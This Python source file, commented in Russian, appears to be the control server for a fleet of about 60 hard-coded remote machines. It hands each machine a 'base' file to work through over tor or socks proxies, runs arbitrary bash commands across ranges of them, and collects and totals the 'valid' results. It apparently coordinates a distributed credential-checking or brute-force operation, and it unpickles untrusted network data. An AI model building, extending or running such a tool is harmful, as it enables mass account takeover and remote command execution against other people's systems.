import pickle
import socket
import gevent
import struct
import sys
import base64
import os
from sys import platform



if platform == 'win32':
    import msvcrt
elif platform == 'linux' or platform == 'linux2' or platform == 'darwin':
    import select
    from select import POLLIN

from gevent import monkey
monkey.patch_all()
from gevent import select
from gevent.queue import Queue

from colorama import init
init()

cls = []
cls.append('185.203.243.123')#ded1
cls.append('185.209.21.15')#ded2
cls.append('185.209.21.18')#ded3
cls.append('185.209.21.37')#ded4
cls.append('185.209.21.93')#ded5
cls.append('185.209.21.66')#ded6
cls.append('185.209.21.56')#ded7
cls.append('185.209.21.133')#ded8
cls.append('185.209.21.29')#ded9
cls.append('185.209.20.222')#ded10
cls.append('185.209.21.119')#ded11
cls.append('185.209.21.40')#ded12
cls.append('185.209.21.47')#ded13
cls.append('185.209.21.114')#ded14
cls.append('185.209.20.219')#ded15
cls.append('185.209.21.24')#ded16
cls.append('185.209.20.225')#ded17
cls.append('185.209.20.212')#ded18
cls.append('185.209.21.86')#ded19
cls.append('185.209.21.59')#ded20
cls.append('185.209.23.46')#ded21
cls.append('185.209.23.103')#ded22
cls.append('185.209.23.73')#ded23
cls.append('185.209.23.79')#ded24
cls.append('185.209.23.95')#ded25
cls.append('185.209.23.36')#ded26
cls.append('185.209.23.121')#ded27
cls.append('185.209.22.251')#ded28
cls.append('185.209.22.215')#ded29
cls.append('185.209.22.227')#ded30
cls.append('185.209.22.252')#ded31
cls.append('185.209.23.93')#ded32
cls.append('185.209.21.211')#ded33
cls.append('185.209.21.203')#ded34
cls.append('185.209.21.198')#ded35
cls.append('185.209.21.154')#ded36
cls.append('185.209.21.205')#ded37
cls.append('185.209.21.159')#ded38
cls.append('185.209.23.12')#ded39
cls.append('185.209.23.54')#ded40
cls.append('185.209.22.233')#ded41
cls.append('185.209.22.197')#ded42
cls.append('185.209.22.200')#ded43
cls.append('185.209.22.169')#ded44
cls.append('185.209.22.185')#ded45
cls.append('185.209.23.134')#ded46
cls.append('185.209.22.244')#ded47
cls.append('185.209.22.143')#ded48
cls.append('185.209.22.110')#ded49
cls.append('185.209.23.112')#ded50
cls.append('185.209.22.128')#ded51
cls.append('185.209.22.108')#ded52
cls.append('185.209.22.102')#ded53
cls.append('185.209.22.79')#ded54
cls.append('185.209.22.69')#ded55
cls.append('185.209.22.59')#ded56
cls.append('185.209.22.65')#ded57
cls.append('185.209.22.21')#ded58
cls.append('185.209.21.250')#ded59
cls.append('185.203.242.110')#ded60
#cls.append('192.168.1.1') #local



ip = '192.168.1.119'

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


socket = socket.socket()
socket.bind((ip, 9093))
socket.listen(2)

from classes import client_item
from classes import comm_data


class initServ:

    def __init__(self, socket):
        self.q = Queue()
        self.sock = socket
        self.clients = []
        self.id = 1
        self.initcmds()
        self.DF = False

    def cmd_start(self):
        self.info_msg('start')

    def initcmds(self):
    # 0 - cmd, 1 - argtypes, 2 - range, 3 - func

        self.cmd = []

        def cl_byip(ip):
            for i in self.clients:
                if i.addr == ip:
                    return i
            else:
                return None

        def cl_byid(id):
            for i in self.clients:
                if i.id == id:
                    return i
            self.info_msg('Клиент не найден!')
            return None

        def cmd_start(self, arglist):
            path = arglist[1]
            proxy = arglist[2]
            if not (proxy == 'tor' or proxy == 'socks' or proxy == 'noproxy'):
                self.info_msg('Неверно выбран тип подключения. (tor, socks, noproxy')
                return
            if isinstance(arglist[0], int):
                cl = cl_byid(arglist[0])
                if not cl:
                    return
                self.start_client(cl, [arglist[1]+'_'+str(cl.id)+'.txt', proxy])
            elif isinstance(arglist[0], list):
                id1 = arglist[0][0]
                id2 = arglist[0][1]
                if id1 >= id2:
                    self.info_msg('Неверно указан диапазон. Сначала указывается меньший id клиента, затем больший.')
                    return
                for i in self.clients:
                    if i.id >= id1 and i.id <= id2:
                        self.start_client(i, [path+'_'+str(i.id)+'.txt', proxy])

        self.cmd.append(['start', [[int,list], str, str or None], cmd_start ]) # start clid_int_or_range_of_int path_str

        def cmd_clean(self, arglist):
            filen = arglist[1]
            if isinstance(arglist[0], int):
                cl = cl_byid(arglist[0])
                if cl:
                    self.clean_client(cl, [filen+'_'+str(cl.id)])
            elif isinstance(arglist[0], list):
                id1 = arglist[0][0]
                id2 = arglist[0][1]
                if id1 >= id2:
                    self.info_msg('Неверно указан диапазон. Сначала указывается меньший id клиента, затем больший.')
                    return
                for i in self.clients:
                    if i.id >= id1 and i.id <= id2:
                        self.clean_client(i, [filen + '_' + str(i.id)])

        self.cmd.append(['clean', [[int,list], str], cmd_clean])

        def cmd_bash(self, arglist):
            cmd = arglist[1]
            if isinstance(arglist[0], int):
                cl = cl_byid(arglist[0])
                if cl:
                    self.bash_client(cl, [cmd])
            elif isinstance(arglist[0], list):
                id1 = arglist[0][0]
                id2 = arglist[0][1]
                if id1 >= id2:
                    self.info_msg('Неверно указан диапазон. Сначала указывается меньший id клиента, затем больший.')
                    return
                for i in self.clients:
                    if i.id >= id1 and i.id <= id2:
                        newcmd = cmd
                        if '%id%' in cmd:
                            newcmd = cmd.replace('%id%', str(i.id))
                            self.info_msg(newcmd)
                        self.bash_client(i, [newcmd])

        self.cmd.append(['bash', [[int,list], str], cmd_bash])

        def cmd_stop(self, arglist):
            if isinstance(arglist[0], int):
                cl = cl_byid(arglist[0])
                if not cl:
                    return
                self.stop_client(cl)
            elif isinstance(arglist[0], list):
                id1 = arglist[0][0]
                id2 = arglist[0][1]
                if id1 >= id2:
                    self.info_msg('Неверно указан диапазон. Сначала указывается меньший id клиента, затем больший.')
                    return
                #elif id2 > len(self.clients):
                    #self.info_msg('Неверно указан диапазон. Подключено меньшее кол-во клиентов ' + str(len(self.clients)))
                    #return
                for i in self.clients:
                    if i.id >= id1 and i.id <= id2:
                        self.stop_client(i)

            #self.stop_client(cl.sock)

        self.cmd.append(['stop', [[int,list]], cmd_stop]) # stop clid_int_or_range_of_int

        def cmd_getstatus(self, arglist):
            self.info_msg('Всего клиентов найдено: ' + str(len(self.clients)))
            sumvalid = 0
            i = 0
            for j in cls:

                cl = cl_byip(j)
                if cl:
                    if cl.stat == 1:
                        stat_msg = 'работает '
                        val_msg = 'на строке -'
                    elif cl.stat == 2:
                        stat_msg = 'занят обработкой'
                        val_msg = ', последняя строка -'
                    else:
                        stat_msg = 'отдыхает'
                        val_msg = ', последняя строка -'
                    #self.info_msg('%-10s' % str(cl.addr))
                    self.info_msg(bcolors.OKBLUE + '['+ bcolors.OKGREEN + '%-15s' % cl.addr + bcolors.OKBLUE +']ID ' + str(cl.id) + ': Статус: '+ bcolors.OKGREEN + stat_msg + val_msg + ' ' + str(cl.str) + bcolors.OKBLUE + '. Валид: ' + bcolors.OKGREEN + str(cl.valid) +  bcolors.FAIL + ' Ошибки: '+ str(cl.errs)  + ' Скорость ' + str(cl.speed) + ' Прокси: ' + str(cl.proxy) +" :" + str(cl.proxy_num) + bcolors.ENDC)
                    if isinstance(cl.valid, int):
                        sumvalid += cl.valid
                else:
                    self.info_msg(bcolors.OKBLUE + '['+ bcolors.OKGREEN + '%-15s' % j + bcolors.OKBLUE +']ID ' + str(i) + ':' + bcolors.FAIL + ' Нет данных!' + bcolors.ENDC)
                i = i + 1
            self.info_msg('Незарегистрированные клиенты: ' + str(len(self.clients)))
            for i in self.clients:
                if i.id >=1000:
                    if i.stat == 1:
                        stat_msg = 'работает '
                        val_msg = 'на строке -'
                    elif i.stat == 2:
                        stat_msg = 'занят обработкой'
                        val_msg = ', последняя строка -'
                    else:
                        stat_msg = 'отдыхает'
                        val_msg = ', последняя строка -'

                    self.info_msg(bcolors.OKBLUE + '[' + bcolors.OKGREEN + '%-15s' % i.addr + bcolors.OKBLUE + ']ID ' + str(i.id) + ': Статус: ' + bcolors.OKGREEN + stat_msg + val_msg + ' ' + str(i.str) + bcolors.OKBLUE + '. Валид: ' + bcolors.OKGREEN + str(i.valid) +  bcolors.FAIL + ' Ошибки: ' + str(i.errs)  + ' Скорость ' + str(i.speed) + ' Прокси: ' + str(i.proxy) +" :" + str(i.proxy_num) + bcolors.ENDC)
                    if isinstance(i.valid, int):
                        sumvalid += i.valid

            self.info_msg(bcolors.WARNING + 'Суммарный валид: ' + str(sumvalid) + bcolors.ENDC)
        self.cmd.append(['status', [], cmd_getstatus])


        def cmd_sendfile(self, arglist):
            path = arglist[0]

            self.info_msg('Запущена отправка файлов ' + path + ' по клиентам.')
            for i in self.clients:
                self.info_msg('Попытка отправить на ' + str(i.id) + ' клиент..')
                size = self.send_file(i, path + '_' + str(i.id) + '.txt')
                if size:
                    self.info_msg('Фпйл передан. Передано ' + str(size) + ' байтов.')

        self.cmd.append(['sendfiles', [str], cmd_sendfile ]) # sendfiles path_str

        def cmd_getvalid(self, arglist):
            path = arglist[0]
            for i in self.clients:
                self.info_msg('Прием файла с ' + str(i.id) + ' клиента..')
                if not self.receive_file(i, path + '_'+str(i.id)+'_valid.txt'):
                    self.info_msg('Проблемы с соединением..')

        self.cmd.append(['getvalid', [str], cmd_getvalid])  # sendfiles path_str

    def recv_piece(self, connection, n):
        piece = b''

        while len(piece) < n:

            try:
                packet = connection.recv(n - len(piece))
            except ConnectionResetError:
                self.client_remove(connection)
                #self.info_msg('Recv_piece, reseted')
                return None
            except ConnectionAbortedError:
                self.client_remove(connection)
                #self.info_msg('Recv_piece, aborted')
                return None
            if not packet:
                return None
            piece += packet
        return piece

    def client_remove(self, conn):

        conn.close()

        for i in self.clients:

            if i.sock == conn:
                addr = i.addr
                id = i.id
                #self.info_msg("Клиент[id "+str(id)+"] с ip-адресосм " + addr + " удален из таблицы")
                for k in reversed(self.clients):
                    #self.info_msg(k.id)
                    if not conn == k.sock:
                        k.id -= 1
                    else:
                        break
                self.info_msg(bcolors.FAIL + "Клиент[id " + str(id) + "] с ip-адресосм " + addr + " удален из таблицы" + bcolors.ENDC)
                self.clients.remove(i)
                break

    def recv(self, connection):

        type_data = self.recv_piece(connection, 4)
        if not type_data:
            return None
        data_type = struct.unpack('>I', type_data)[0]


        length_data = self.recv_piece(connection, 4)
        #self.info_msg(length_data)
        if not length_data:
            return None

        data_len = struct.unpack('>I', length_data)[0]
        #self.info_msg(data_len)
        data = self.recv_piece(connection, data_len)

        return data_type, data

    def send_comm(self, conn, data, addr):
        pdata = pickle.dumps(data,4)
        pdata = struct.pack('>I', len(pdata)) + pdata
        pdata = struct.pack('>I', 1 ) + pdata
        conn.send(pdata)
        #self.info_msg("На клиент[" + addr[0] +"]: " + str(data))


    def send_ping(self, cl):
        if cl.stat == 2 :
            return
        pdata = pickle.dumps(1, 4)
        pdata = struct.pack('>I', len(pdata)) + pdata
        pdata = struct.pack('>I', 0) + pdata
        try:
            cl.sock.send(pdata)
        except:
            self.client_remove(cl.sock)
            self.info_msg('Send_ping')

    def parse(self, conn):
        data = b""
        cl = None
        try:
            type, data = self.recv(conn)
        except TypeError:
            return None

        if not data:
            return None

        for i in self.clients:
            if i.sock == conn:
                cl = i
                break

        #unpdata = pickle.loads(data)

        if type == 0:

            #if b'classes_serv' in data:
                #data = data.replace( b'classes_cl', b'classes_serv')
            cl.stat = pickle.loads(data).stat
            cl.str = pickle.loads(data).str
            cl.valid = pickle.loads(data).valid
            cl.errs = pickle.loads(data).errs
            cl.speed = pickle.loads(data).speed
            cl.proxy = pickle.loads(data).proxy
            cl.proxy_num = pickle.loads(data).proxy_num

        elif type == 2:
            self.info_msg("От клиента["+cl.addr+"] ID "+str(cl.id) + ':' + pickle.loads(data).msg)
        else:
            self.info_msg("От клиента[ip]: " + str(pickle.loads(data)))
        #answer = "hello guy"
        #self.send_answer(conn, answer, addr)

    def kill_worker(self, greenlet):

        if greenlet in self.threads:
            self.threads.remove(greenlet)
            self.info_msg(greenlet.name + " removed")
            gevent.kill(greenlet)
        else:
            self.info_msg("Error! While thread removing")

    def join_worker(self, greenlet):

        self.threads.append(greenlet)
        greenlet.join()
        self.info_msg(greenlet.name + ' inited')

    def communication_worker(self):
        while 1:
            gevent.sleep(1)

            if len(self.clients) != 0:
                for i in (self.clients):
                    try:
                        self.send_ping(i)
                    except IndexError:
                        break
                window.updClientLists(self.clients)

    def online_worker(self):
        while 1:
            self.info_msg("Check connection!")
            gevent.sleep(1)
            #gevent.sleep(1)


    def command_worker(self):

        poll = select.poll()
        poll.register(0, POLLIN)

        while 1:
            if poll.poll(2):
                comm = os.read(0, 64)
                self.call_cmd(comm.decode("UTF-8"))

    def command_worker_windows(self):
        cmd = b''
        c = b''
        self.info_msg(platform)
        while 1:

            if msvcrt.kbhit():

                cr = msvcrt.getwch()
                c = cr.encode('utf-8')
                try:
                    msvcrt.putch(c)
                except TypeError:
                    continue

                if c != b'\r' and c != b'\x08':
                    cmd += c
                    c = b''
                elif c == b'\x08':
                    cmd = cmd[:len(cmd)-1]
                    msvcrt.putch(b' ')
                    msvcrt.putch(b'\x08')
                elif c == b'\r':
                    os.write(1, b'\n')
                    try:
                        self.call_cmd(cmd.decode("UTF-8"))
                    except UnicodeDecodeError:
                        self.info_msg('Неверный формат')

                    cmd = b''
            gevent.sleep(0.1)

    def call_cmd(self, cmd):
        if '\n' in cmd:
            cmd = cmd[0:len(cmd)-1]
        client = None


        args = cmd.split(' ')
        cmd = args[0]
        for cmdnum in self.cmd:
            if cmdnum[0] == cmd:
                argtypes = cmdnum[1]
                argval = len(argtypes)
                func = cmdnum[2]
                if (len(args) - 1) != argval:
                    self.info_msg('Неверное количество аргументов.')
                    return
                arglist = []

                for i in range(argval):

                    arg = args[i+1]
                    if arg == '':
                        self.info_msg('Неверный формат')
                        return
                    if argtypes[i] == int:
                        try:
                            arg = int(arg)
                        except ValueError:
                            self.info_msg(str(i + 1) + '-й аргумент задан неверно.')
                            return
                        arglist.append(arg)
                    elif argtypes[i] == str:
                        arglist.append(arg)

                    elif type(argtypes[i]) == list:
                        if argtypes[i][0] == int or argtypes[i][1] == int:
                            try:
                                arg = int(arg)
                                arglist.append(arg)

                            except ValueError:
                                if argtypes[i][1] == list or argtypes[i][0] == list:
                                    argrange = arg.split('-')
                                    if len(argrange) == 2:
                                        try:
                                            argrange[0] = int(argrange[0])
                                            argrange[1] = int(argrange[1])
                                            arglist.append(argrange)
                                        except ValueError:
                                            self.info_msg(str(i + 1) + '-й аргумент задан неверно.')
                                            return
                                    else:
                                        self.info_msg(str(i + 1) + '-й аргумент задан неверно.')
                                        return

                    else:
                        self.info_msg(str(i+1) + '-й аргумент задан неверно.')
                        return
                func(self,arglist)
                return
        self.info_msg('Команда не найдена!')

    def start_client(self, cl, ar):
        if cl.stat == 2:
            self.info_msg('Клиент '+str(cl.id)+' занят..подождите')
            return
        if cl.stat == 0:
            self.send_comm(cl.sock, comm_data("cmd_start", ar), cl.addr)
        else:
            self.info_msg('Клиент '+str(cl.id)+' работает, сначало необходимо остановить!')

    def stop_client(self, cl, ar=None):
        if cl.stat == 2:
            self.info_msg('Клиент '+str(cl.id)+' занят..подождите')
            return

        if cl.stat == 1:
            self.send_comm(cl.sock, comm_data("cmd_stop", ar), cl.addr)
        else:
            self.info_msg('Клиент '+str(cl.id)+' не запущен!')

    def clean_client(self, cl, ar=None):
        if cl.stat == 0:
            self.send_comm(cl.sock, comm_data("cmd_cleanv", ar), cl.addr)
            return
        else:
            self.info_msg('Клиент '+str(cl.id)+' занят..подождите')

    def bash_client(self, cl, ar=None):
        if cl.stat != 2 or cl.stat != 3:
            self.send_comm(cl.sock, comm_data("cmd_bash", ar), cl.addr)
        else:
            self.info_msg('Клиент '+str(cl.id) + ' занят..подождите')

    def clientlistener_worker(self):
        while 1:
            gevent.sleep(0)
            if len(self.clients) > 0:
                i = 0
                while i != len(self.clients):
                    #rint("listening client " + str(i) + "..")
                    try:
                        self.parse(self.clients[i].sock)
                    except IndexError:
                        break

                    i += 1
    def receive_file(self, cl, file):

        if cl.stat != 0:
            self.info_msg('Клиент ' +str(cl.id) + ' занят! Файл не получен')
            return

        conn = cl.sock

        l = pickle.dumps(file, 4)
        l = struct.pack('>I', len(l)) + l
        l = struct.pack('>I', 3) + l
        conn.send(l)

        import socket
        fileconn = socket.socket()
        fileconn.bind((ip, 91))
        fileconn.listen(2)
        fileconn.settimeout(5)
        try:
            con, adr = fileconn.accept()

        except socket.timeout:
            return

        while 1:
            try:
                data = con.recv(32768)
            except ConnectionResetError:
                self.info_msg('Receive error..')
                return
            if not data:
                con.close()
                break

            f = open('validall.txt', 'ab')
            f.write(data)
            f.close()

        return True

    def send_file(self, cl, file):
        try:
            f = open(file, "rb")
        except FileNotFoundError:
            self.info_msg(bcolors.FAIL + 'Ошибка! Не найден файл ' + file + bcolors.ENDC)
            return
        conn = cl.sock
        if cl.stat != 0:
            self.info_msg('Клиент ' +str(cl.id) + ' занят! Файл не отправлен')
            return

        l = pickle.dumps(file, 4)
        l = struct.pack('>I', len(l)) + l
        l = struct.pack('>I', 2) + l
        conn.send(l)

        import socket
        fileconn = socket.socket()
        fileconn.bind(('127.0.0.1', 91))
        fileconn.listen(2)

        con, adr = fileconn.accept()

        try:
            s = con.sendfile(f, 0)
        except ConnectionResetError:
            s = 0
            pass

        con.close()
        f.close()
        return s

    def listen_worker(self, socket):

        self.info_msg( "up server done!")
        while 1:
            gevent.sleep(0)
            conn, addr = socket.accept()
            id_cl = len(self.clients)+1000
            for i in range(len(cls)):
                if cls[i] == addr[0]:
                    id_cl = i
            self.clients.append(client_item(conn, addr[0], id_cl))



            #self.send_file(conn, '1.txt')
            self.info_msg(bcolors.OKGREEN + "Новое соединение от " + bcolors.OKBLUE + addr[0] + bcolors.OKGREEN + " присвоен id #" + str(id_cl) + bcolors.ENDC)

    def info_msg(self, msg):
        if withgui:
            if type(msg) != str: msg = str(msg)
            window.plainTextEdit.insertPlainText(msg+'\n')
        print(msg)

    def mainloop(self):
        while True:
            app.processEvents()
            # while app.hasPendingEvents():
            # app.processEvents()
            # gevent.sleep(0)
            gevent.sleep(0.01)  # don't appear to get here but cooperate again




import sys
from PyQt5 import QtWidgets
import design  # Это наш конвертированный файл дизайна


class GuiApp(QtWidgets.QMainWindow, design.Ui_MainWindow):
    def __init__(self, server):
        # Это здесь нужно для доступа к переменным, методам
        # и т.д. в файле design.py
        self.serv = server
        super().__init__()
        self.setupUi(self)  # Это нужно для инициализации нашего дизайна
        self.plainTextEdit.setMaximumBlockCount(50)
        for i in range(10000):
            self.plainTextEdit.insertPlainText('mystr\n')
        self.pushButton_3.clicked.connect(self.send_cmd)
        self.lineEdit.returnPressed.connect(self.send_cmd)
        self.tableWidget.itemSelectionChanged.connect(self.selectionChanged)
        self.pushButton_7.clicked.connect(self.buildStartWindow)
        self.pushButton_6.clicked.connect(self.buildStopWindow)

    def getSelectedIDs(self):
        ranges = self.tableWidget.selectedRanges()
        ids = []
        for r in ranges:
            iter = r.bottomRow() + 1 - r.topRow()
            start = r.topRow()
            for i in range(iter):
                item = self.tableWidget.item(i+start, 0)
                ids.append(item.text())
        return ids
    def buildStartWindow(self):

        clientIds = self.getSelectedIDs()
        if len(clientIds) == 0: strd = "Выделите клиентов"

        base, ok = QtWidgets.QInputDialog.getText(self, 'Start Clients',
                                        'Выделено '+str(len(clientIds)) + ' клиентов. Название базы:')
        proxy = "noproxy"
        if ok:
            for id in clientIds:
                cmd = self.serv.cmd[0][0] + ' ' + str(id) + ' ' + base + ' ' + proxy
                self.serv.call_cmd(cmd)

    def buildStopWindow(self):

        clientIds = self.getSelectedIDs()
        if len(clientIds) == 0: strd = "Выделите клиентов"

        buttonReply = QtWidgets.QMessageBox.question(self, 'Stop clients', "Stop "+str(len(clientIds)) +" clients?",
                                        QtWidgets.QMessageBox.Yes | QtWidgets.QMessageBox.No, QtWidgets.QMessageBox.No)
        if buttonReply == QtWidgets.QMessageBox.Yes:
            for id in clientIds:
                cmd = self.serv.cmd[3][0] + ' ' + str(id)
                self.serv.call_cmd(cmd)
        else:
            print('No clicked.')


    def updClientLists(self, clients):
        ranges = self.tableWidget.selectedRanges()

        self.tableWidget.clearContents()
        self.tableWidget.setRowCount(len(clients))
        for i in clients:
            x = clients.index(i)
            for y in range(i.getbynum()):
                item = QtWidgets.QTableWidgetItem()
                self.tableWidget.setItem(x, y, item)
                item.setText(str(i.getbynum(y)))

        for r in ranges:
            self.tableWidget.setRangeSelected(r, True)

    def selectionChanged(self):
        try:
            ranges = self.tableWidget.selectedRanges()
            for range in ranges:
                top = range.topRow()
                bottom = range.bottomRow()
                robj = QtWidgets.QTableWidgetSelectionRange(top,0,bottom,6)
                self.tableWidget.setRangeSelected(robj, True)
        except:
            pass

    def send_cmd(self):
        self.lineEdit.selectAll()
        self.serv.call_cmd(self.lineEdit.selectedText())
        self.lineEdit.clear()




withgui = True
serv = initServ(socket)
app = QtWidgets.QApplication(sys.argv)
window = GuiApp(serv)
window.show()
def asynchronous(self):
    self.threads = []
    self.threads.append(gevent.spawn(self.mainloop))
    self.threads.append(gevent.spawn(self.listen_worker, self.sock))
    self.threads.append(gevent.spawn(self.clientlistener_worker))
    self.threads.append(gevent.spawn(self.communication_worker))
    if platform == 'win32':
        self.threads.append(gevent.spawn(self.command_worker_windows))
    elif platform == 'linux' or platform == 'linux2' or platform == 'darwin':
        self.threads.append(gevent.spawn(self.command_worker))
    self.info_msg(type(self.threads))
    gevent.joinall(self.threads)

asynchronous(serv)